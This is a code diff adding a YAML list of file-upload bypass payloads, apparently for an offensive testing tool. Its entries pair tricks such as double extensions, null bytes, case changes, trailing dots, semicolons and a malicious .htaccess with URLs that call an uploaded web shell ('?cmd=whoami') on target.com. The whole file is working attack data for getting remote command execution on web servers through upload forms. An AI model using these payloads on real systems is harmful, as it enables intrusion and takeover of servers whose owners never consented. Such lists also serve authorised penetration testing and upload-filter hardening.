@@ -1,0 +1,31 @@
+- name: double_extension
+  pattern: "{basename}.php.jpg"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: double_extension_reverse
+  pattern: "{basename}.jpg.php"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: case_insensitivity
+  pattern: "{basename}.PhP"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: trailing_dot
+  pattern: "{basename}.php."
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: null_byte
+  pattern: "{basename}.php%00.jpg"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: semicolon
+  pattern: "{basename}.php;.jpg"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
+
+- name: htaccess
+  pattern: ".htaccess"
+  access: "1. Upload this .htaccess file. 2. Upload a simple 'shell.jpg'. 3. Access: http://target.com/uploads/shell.jpg?cmd=whoami"
+
+- name: no_extension
+  pattern: "{basename}"
+  access: "http://target.com/uploads/{filename}?cmd=whoami"
